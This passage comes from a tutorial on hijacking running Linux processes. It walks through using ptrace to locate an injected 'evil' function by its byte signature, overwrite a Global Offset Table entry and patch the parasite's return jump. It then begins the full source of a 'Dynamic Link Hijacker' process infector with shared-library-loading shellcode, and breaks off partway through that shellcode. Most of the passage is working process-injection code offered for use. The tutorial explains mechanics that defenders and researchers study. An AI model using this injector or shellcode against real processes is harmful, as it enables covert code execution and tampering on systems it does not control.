bfb24000-bfb39000 rw-p bffeb000 00:00 0          [stack]
ffffe000-fffff000 r-xp 00000000 00:00 0          [vdso]
</pre>
<p>As you can see the base address is b7f1b000. A simple function to 
extract this value is used in the hijacker provided later on, it is 
important to note that with grsec these addresses will not be available,
 in which case we should just get the address from %eax after mmap'ng 
it.</p>
<p><strong>Step 10</strong></p>
<p>Now that we have the base address of our shared object, we need to 
locate the evil function itself so that we can store it in the GOT, and 
also patch its "transfer code" with the address of the original function
 for when we need to transfer execution back (remember that the transfer
 code is the ending code in the parasite -- either a function pointer, 
or a jump --</p>
<p>One method to find our evil function is to scan memory for its 
signature code sequence. We can use the first 8 bytes as the code 
sequence... lets look at the following parasite:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span><br>
evilprint <span style="color: black;">(</span><span style="color: #993333;">char</span> *buf<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
<br>
&nbsp; <span style="color: #993333;">char</span> new_string<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'e'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'v'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'i'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> = <span style="color: #ff0000;">'l'</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp;new_string<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> = <span style="color: #cc66cc;">0</span>;<br>
<br>
&nbsp; <span style="color: #993333;">int</span> <span style="color: black;">(</span>*origfunc<span style="color: black;">)</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *p<span style="color: black;">)</span> = 0x00000000;<br>
&nbsp; origfunc<span style="color: black;">(</span>new_string<span style="color: black;">)</span>;<br>
<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Using objdump we can disassemble it to find its signature</p>
<pre class="source">00000248 &lt;evilprint&gt;:
 248:   55                      push   %ebp
 249:   89 e5                   mov    %esp,%ebp
 24b:   83 ec 18                sub    $0x18,%esp
 24e:   c6 45 f7 65             movb   $0x65,-0x9(%ebp)
 252:   c6 45 f8 76             movb   $0x76,-0x8(%ebp)
 256:   c6 45 f9 69             movb   $0x69,-0x7(%ebp)
 25a:   c6 45 fa 6c             movb   $0x6c,-0x6(%ebp)
 25e:   c6 45 fb 00             movb   $0x0,-0x5(%ebp)
 262:   c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%ebp)
 269:   83 ec 0c                sub    $0xc,%esp
 26c:   8d 45 f7                lea    -0x9(%ebp),%eax
 26f:   50                      push   %eax
 270:   8b 45 fc                mov    -0x4(%ebp),%eax
 273:   ff d0                   call   *%eax
 275:   83 c4 10                add    $0x10,%esp
 278:   c9                      leave
 279:   c3                      ret
</pre>
<p>The first 3 bytes '\x55\x89\xe5' are standard prologue, so lets use 
those to mark the start of a function, and include the following 5 bytes
 as well. Then we will have a unique signature to mark where our 
parasite starts within memory:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> evilsig<span style="color: black;">[</span><span style="color: black;">]</span> = <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>55<span style="color: #000099; font-weight: bold;">\x</span>89<span style="color: #000099; font-weight: bold;">\x</span>e5<span style="color: #000099; font-weight: bold;">\x</span>83<span style="color: #000099; font-weight: bold;">\x</span>ec<span style="color: #000099; font-weight: bold;">\x</span>18<span style="color: #000099; font-weight: bold;">\x</span>c6<span style="color: #000099; font-weight: bold;">\x</span>45"</span>;</div>
<p>It may be wise to use a larger signature, but our example shared 
library is very small and its safe to say that the first 8 bytes are 
unique to our function only. In order to get the address of our evil 
function we simply use ptrace PEEKTEXT request to read our shared object
 mapping into a buffer starting at its base address that we extracted 
from the map file. i.e </p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>, j = <span style="color: #cc66cc;">0</span>; i &lt; size; i+= <span style="color: #993333;">sizeof</span><span style="color: black;">(</span>uint32_t<span style="color: black;">)</span>, j++<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span><span style="color: black;">(</span><span style="color: black;">(</span><span style="color: black;">(</span>data = ptrace<span style="color: black;">(</span>PTRACE_PEEKTEXT, pid, vaddr + i<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span> &amp;&amp; errno<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">return</span> <span style="color: #cc66cc;">-1</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; buf<span style="color: black;">[</span>j<span style="color: black;">]</span> = data;<br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Then search for our signature:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; LIBSIZE; i++<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>buf<span style="color: black;">[</span>i<span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+2</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+3</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+4</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">4</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+5</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">5</span><span style="color: black;">]</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+6</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">6</span><span style="color: black;">]</span> &amp;&amp; buf<span style="color: black;">[</span>i<span style="color: #cc66cc;">+7</span><span style="color: black;">]</span> == evilsig<span style="color: black;">[</span><span style="color: #cc66cc;">7</span><span style="color: black;">]</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;evilvaddr = <span style="color: black;">(</span>vaddr + i<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>Another method, which is simpler and better, although I didn't think 
of it when initially writing the code, is to find the offset of your 
evil function since it should generally stay consistent. This is trivial
 and can be implemented easier than the method shown above. i.e</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">evilvaddr = base + offset;</div>
<p><strong>Step 11-13</strong></p>
<p>In addition to modifying the GOT entry with the address of our evil 
function, we need to patch the transfer code in the evil function with 
the memory address of the original function. If you scroll back up to 
the disassembled evil function "evilprint" and look on the 9th line you 
will see the transfer code that we must patch:</p>
<pre class="source">262:   c7 45 fc 00 00 00 00    movl   $0x0,-0x4(%ebp)</pre>
<p>That line is the function pointer assignment we did in C --</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">int</span> <span style="color: black;">(</span>*origfunc<span style="color: black;">)</span><span style="color: black;">(</span><span style="color: #993333;">char</span> *p<span style="color: black;">)</span> = 0x00000000;</div>
<p>We need to locate that within the evil function and patch it with the
 memory address of the original function. How do we get the address of 
the original function? If you recall, the get_plt() code I demonstrated 
in step 2 will pull the relocation entries which contain virtual 
address/offsets into the global offset table where we can find what we 
need.</p>
<p>Using some code I wrote that basically pulls relocation offsets, 
their values, and the corresponding symbols of a running process we can 
take a look at our test program while running:</p>
<pre class="source">r_offset: 804a000
symbol:   __gmon_start__
export address: 8048306

r_offset: 804a004
symbol:   __libc_start_main
export address: b7dd5f00

r_offset: 804a008
symbol:   sleep
export address: b7e4dbb0

r_offset: 804a00c
symbol:   puts
export address: b7e185c0
</pre>
<p>What is it we are looking at above? The r_offset (relocation offset) 
is the address in the GOT, the export address is the value stored there.
 If you notice the export address for puts() is b7e185c0, that is its 
resolved address in libc -- how do I know that? Due to lazy linking, 
before puts() gets called the first time (as we learned earlier) it will
 have a stub address that points back to the PLT, and it will start with
 '804'.</p>
<p>So our goal is to get the address for puts() stored in the global offset table r_offset -- Here is an example:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"> <span style="color: #b1b100;">if</span> <span style="color: black;">(</span><span style="color: black;">(</span>lp = <span style="color: black;">(</span><span style="color: #993333;">struct</span> linking_info *<span style="color: black;">)</span>get_plt<span style="color: black;">(</span>mem<span style="color: black;">)</span><span style="color: black;">)</span> == <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span><br>
&nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"get_plt() failed<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp;<span style="color: black;">}</span><br>
&nbsp;<br>
&nbsp;<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; lp<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span>.<span style="color: #202020;">count</span>; i++<span style="color: black;">)</span><br>
&nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>strcmp<span style="color: black;">(</span>lp<span style="color: black;">[</span>i<span style="color: black;">]</span>.<span style="color: #202020;">name</span>, <span style="color: #ff0000;">"puts"</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">0</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span> <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #808080; font-style: italic;">/*<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; memrw() uses ptrace to perform several tasks, including<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retrieving the original function address from the GOT, and <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; overwriting it with the new function (evilprint) address <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; the memrw() MODIFY_GOT request will return the final value <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; of the GOT entry, which should contain the address of the new <br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; function, this way we can check to make sure its been properly<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; updated.<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span><br>
&nbsp;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;export = memrw<span style="color: black;">(</span><span style="color: #000000; font-weight: bold;">NULL</span>, lp<span style="color: black;">[</span>i<span style="color: black;">]</span>.<span style="color: #202020;">offset</span>, MODIFY_GOT, pid, evilfunc<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">if</span> <span style="color: black;">(</span>export == evilfunc<span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Successfully modified GOT entry<span style="color: #000099; font-weight: bold;">\n</span><span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #b1b100;">else</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"Failed at modifying GOT entry<span style="color: #000099; font-weight: bold;">\n</span>"</span><span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">goto</span> done;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"New GOT value: %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, export<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black;">}</span><br>
&nbsp;<span style="color: black;">}</span><br>
&nbsp;</div>
<p>We've now retrieved the original address of the function we are 
hijacking, and modified the GOT entry with the address to our evil 
function. We need to carry out the final step and patch the evil 
functions transfer code, so that when its done it can call the original 
function. We need to use our memrw() function (the src for it is 
revealed in the included hijacker) to read our evil function into a 
buffer and determine the address of where to patch the transfer code:</p>
<p>Remember our transfer code signature -- c7 45 fc 00 00 00 00 -- we 
want to patch it with the address of the original function starting 
right after '\xc7\x45\xfc\'.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> evil_code<span style="color: black;">[</span><span style="color: #cc66cc;">256</span><span style="color: black;">]</span>;<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> injection_vaddr = <span style="color: #cc66cc;">0</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* tc[] is short for transfer_code[] */</span><br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">char</span> tc<span style="color: black;">[</span><span style="color: black;">]</span> = <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>c7<span style="color: #000099; font-weight: bold;">\x</span>45<span style="color: #000099; font-weight: bold;">\x</span>fc<span style="color: #000099; font-weight: bold;">\x</span>00"</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* get a copy of our replacement function and search for transfer sequence */</span><br>
memrw<span style="color: black;">(</span><span style="color: black;">(</span><span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> *<span style="color: black;">)</span>evil_code, evilfunc, <span style="color: #cc66cc;">256</span>, pid, <span style="color: #cc66cc;">0</span><span style="color: black;">)</span>;<br>
<br>
<span style="color: #808080; font-style: italic;">/* once located, patch it with the addr of the original function */</span><br>
<br>
<span style="color: #b1b100;">for</span> <span style="color: black;">(</span>i = <span style="color: #cc66cc;">0</span>; i &lt; <span style="color: #cc66cc;">256</span>; i++<span style="color: black;">)</span><br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #b1b100;">if</span> <span style="color: black;">(</span>evil_code<span style="color: black;">[</span>i<span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">0</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+1</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">1</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+2</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">2</span><span style="color: black;">]</span> &amp;&amp; evil_code<span style="color: black;">[</span>i<span style="color: #cc66cc;">+3</span><span style="color: black;">]</span> == tc<span style="color: black;">[</span><span style="color: #cc66cc;">3</span><span style="color: black;">]</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <a style="color: #000060;" href="http://www.opengroup.org/onlinepubs/009695399/functions/printf.html"><span style="color: #000066;">printf</span></a><span style="color: black;">(</span><span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\n</span>Located transfer code; patching it with %x<span style="color: #000099; font-weight: bold;">\n</span>"</span>, original<span style="color: black;">)</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; injection_vaddr = <span style="color: black;">(</span>evilfunc + i<span style="color: black;">)</span> + <span style="color: #cc66cc;">3</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000000; font-weight: bold;">break</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">}</span><br>
<span style="color: black;">}</span><br>
&nbsp;</div>
<p>At this point we can patch it with:</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">memrw<span style="color: black;">(</span><span style="color: #cc66cc;">0</span>, injection_vaddr, INJECT_TRANSFER_CODE, pid, original<span style="color: black;">)</span>;</div>
<p><strong>Step 14</strong></p>
<p>We can now detach from the process and enjoy.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #b1b100;">if</span> <span style="color: black;">(</span>ptrace<span style="color: black;">(</span>PTRACE_DETACH, pid, <span style="color: #000000; font-weight: bold;">NULL</span>, <span style="color: #000000; font-weight: bold;">NULL</span><span style="color: black;">)</span> == <span style="color: #cc66cc;">-1</span><span style="color: black;">)</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; perror<span style="color: black;">(</span><span style="color: #ff0000;">"ptrace_detach"</span><span style="color: black;">)</span>;<br>
&nbsp;</div>
<h2><a name="c7"></a>7 - The Hijacker</h2>
<p>I have included the complete hijacker and an example parasite. The 
hijacker can be used on any process of type ET_EXEC, or ET_DYN. The only
 aspects of the source code that need to be modified are the signatures 
for the evil function and the transfer code, as these will vary but are 
easily found using objdump. The shellcode to load the shared library 
assumes that the shared library is called libtest.so.1.0 and exists in 
/lib directory. The shellcode is available in its ASM form for 
modifications below.</p>
<div class="c" style="font-family: monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #808080; font-style: italic;">/* start of dlh.c */</span><br>
<span style="color: #808080; font-style: italic;">/*<br>
&nbsp;* DLH (Dynamic Link Hijacker) v0.1 (C) Ryan O'Neill 2009<br>
&nbsp;* process infector through GOT modification and shared object linking<br>
&nbsp;* features include ET_DYN processes, and Grsec memory protection bypassing<br>
&nbsp;* for code injection.<br>
&nbsp;*<br>
&nbsp;* Author: Ryan O'Neill<br>
&nbsp;* &lt;ryan@bitlackeys.com<script type="text/javascript">
/* <![CDATA[ */
(function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
/* ]]> */
</script>&gt; <br>
&nbsp;* <br>
&nbsp;* gcc dlh.c -o dlh<br>
&nbsp;* ./dlh &lt;pid&gt; &lt;function to hijack&gt; [opts]<br>
&nbsp;*<br>
&nbsp;*/</span><br>
<br>
<span style="color: #339933;">#include &lt;stdio.h&gt;</span><br>
<span style="color: #339933;">#include &lt;string.h&gt;</span><br>
<span style="color: #339933;">#include &lt;unistd.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/types.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/ptrace.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/mman.h&gt;</span><br>
<span style="color: #339933;">#include &lt;elf.h&gt;</span><br>
<span style="color: #339933;">#include &lt;fcntl.h&gt;</span><br>
<span style="color: #339933;">#include &lt;errno.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/stat.h&gt;</span><br>
<span style="color: #339933;">#include &lt;signal.h&gt;</span><br>
<span style="color: #339933;">#include &lt;stdlib.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/wait.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/user.h&gt;</span><br>
<span style="color: #339933;">#include &lt;sys/syscall.h&gt;</span><br>
<br>
<span style="color: #339933;">#define ORIG_EAX 11</span><br>
<span style="color: #339933;">#define MAXBUF 255</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* memrw() request to modify global offset table */</span><br>
<span style="color: #339933;">#define MODIFY_GOT 1</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* memrw() request to patch parasite */</span><br>
<span style="color: #808080; font-style: italic;">/* with original function address */</span><br>
<span style="color: #339933;">#define INJECT_TRANSFER_CODE 2</span><br>
<br>
<span style="color: #339933;">#define EVILLIB "libtest.so.1.0"</span><br>
<span style="color: #339933;">#define EVILLIB_FULLPATH "/lib/libtest.so.1.0"</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* should be getting lib mmap size dynamically */</span><br>
<span style="color: #808080; font-style: italic;">/* from map file; this #define is temporary */</span><br>
<span style="color: #339933;">#define LIBSIZE 5472 </span><br>
<br>
<span style="color: #808080; font-style: italic;">/* struct to get symbol relocation info */</span><br>
<span style="color: #993333;">struct</span> linking_info<br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">char</span> name<span style="color: black;">[</span><span style="color: #cc66cc;">256</span><span style="color: black;">]</span>;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> index;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">int</span> count;<br>
&nbsp; &nbsp; &nbsp; &nbsp; uint32_t offset;<br>
<span style="color: black;">}</span>;<br>
<br>
<span style="color: #993333;">struct</span> segments<br>
<span style="color: black;">{</span><br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> text_off;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> text_len;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> data_off;<br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> data_len;<br>
<span style="color: black;">}</span> segment;<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> original;<br>
<span style="color: #000000; font-weight: bold;">extern</span> <span style="color: #993333;">int</span> getstr;<br>
<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> text_base;<br>
<span style="color: #993333;">unsigned</span> <span style="color: #993333;">long</span> data_segment;<br>
<span style="color: #993333;">char</span> static_sysenter = <span style="color: #cc66cc;">0</span>; <br>
<br>
<span style="color: #808080; font-style: italic;">/*<br>
_start:<br>
&nbsp; &nbsp; &nbsp; &nbsp; jmp B<br>
A:<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; # fd = open("libtest.so.1.0", O_RDONLY);<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %ecx, %ecx<br>
&nbsp; &nbsp; &nbsp; &nbsp; movb $5, %al<br>
&nbsp; &nbsp; &nbsp; &nbsp; popl %ebx<br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %ecx, %ecx<br>
&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; subl $24, %esp<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; # mmap(0, 8192, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0);<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; xorl %edx, %edx<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %edx, (%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $8192,4(%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $7, 8(%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $2, 12(%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %eax,16(%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %edx, 20(%esp)<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl $90, %eax<br>
&nbsp; &nbsp; &nbsp; &nbsp; movl %esp, %ebx<br>
&nbsp; &nbsp; &nbsp; &nbsp; int $0x80<br>
<br>
&nbsp; &nbsp; &nbsp; &nbsp; int3<br>
B:<br>
&nbsp; &nbsp; &nbsp; &nbsp; call A<br>
&nbsp; &nbsp; &nbsp; &nbsp; .string "/lib/libtest.so.1.0"<br>
*/</span><br>
<br>
<span style="color: #808080; font-style: italic;">/* make sure to put your shared lib in /lib and name it libtest.so.1.0 */</span><br>
<span style="color: #993333;">char</span> mmap_shellcode<span style="color: black;">[</span><span style="color: black;">]</span> = <br>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">"<span style="color: #000099; font-weight: bold;">\x</span>e9<span style="color: #000099; font-weight: bold;">\x</span>3b<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>00<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>c9<span style="color: #000099; font-weight: bold;">\x</span>b0<span style="color: #000099; font-weight: bold;">\x</span>05<span style="color: #000099; font-weight: bold;">\x</span>5b<span style="color: #000099; font-weight: bold;">\x</span>31<span style="color: #000099; font-weight: bold;">\x</span>c9<span style="color: #000099; font-weight: bold;">\x</span>cd<span style="color: #000099; font-weight: bold;">\x</span>80<span style="color: #000099; font-weight: bold;">\x</span>83<span style="color: #000099; font-weight: bold;">\x</span>ec"</span><br>
